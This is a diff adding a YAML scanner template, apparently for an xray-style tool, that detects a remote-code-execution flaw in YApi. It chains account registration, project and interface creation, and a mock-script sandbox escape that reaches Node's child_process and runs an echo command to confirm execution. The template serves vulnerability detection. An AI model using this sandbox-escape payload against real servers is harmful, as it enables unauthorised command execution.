@@ -1,0 +1,84 @@
+name: poc-yaml-yapi-rce
+set:
+  redemail: randomLowercase(15)
+  redpassword: randomLowercase(15)
+  redproject: randomLowercase(8)
+  redinterface: randomLowercase(10)
+  r1: randomLowercase(10)
+  r2: randomLowercase(10)
+  r3: randomLowercase(10)
+  r4: randomLowercase(10)
+rules:
+  - method: POST
+    path: /api/user/reg
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    follow_redirects: true
+    body: |
+      {"email":"{{redemail}}@qq.com","password":"{{redpassword}}","username":"{{redemail}}"}
+    expression: |
+      response.status == 200 && response.headers["Set-Cookie"].contains("_yapi_token=") && response.headers["Set-Cookie"].contains("_yapi_uid=") && response.body.bcontains(bytes(redemail))
+
+  - method: GET
+    path: /api/group/list
+    search: |
+      "_id":(?P<group_id>.+?),
+    expression: |
+      response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(bytes("custom_field1"))
+
+  - method: POST
+    path: /api/project/add
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"name":"{{redproject}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}
+    search: |
+      tag":\[\],"_id":(?P<project_id>.+?),
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("成功！")) && response.body.bcontains(bytes(redproject))
+
+  - method: GET
+    path: /api/project/get?id={{project_id}}
+    search: |
+      "_id":(?P<catid>.+?),
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("成功！"))
+
+  - method: POST
+    path: /api/interface/add
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"method":"GET","catid":"{{catid}}","title":"{{redinterface}}","path":"/{{redinterface}}","project_id":{{project_id}}}
+    search: |
+      "_id":(?P<interface_id>.+?),
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("成功！")) && response.body.bcontains(bytes(redinterface))
+
+  - method: POST
+    path: /api/plugin/advmock/save
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"echo {{r1}}${{{r2}}}{{r3}}^{{r4}}\").toString()","enable":true}
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes("成功！"))
+
+  - method: GET
+    path: /mock/{{project_id}}/{{redinterface}}
+    expression: |
+      response.status == 200 && (response.body.bcontains(bytes(r1 + r3 + "^" + r4)) || response.body.bcontains(bytes(r1 + "${" + r2 + "}" + r3 + r4)))
+
+  - method: POST
+    path: /api/project/del
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |
+      {"id":{{project_id}}}
+    expression: |
+      response.status == 200
+detail:
+  author: tangshoupu
+  info: yapi-rce
+  links:
+    - https://github.com/YMFE/yapi/issues/2229
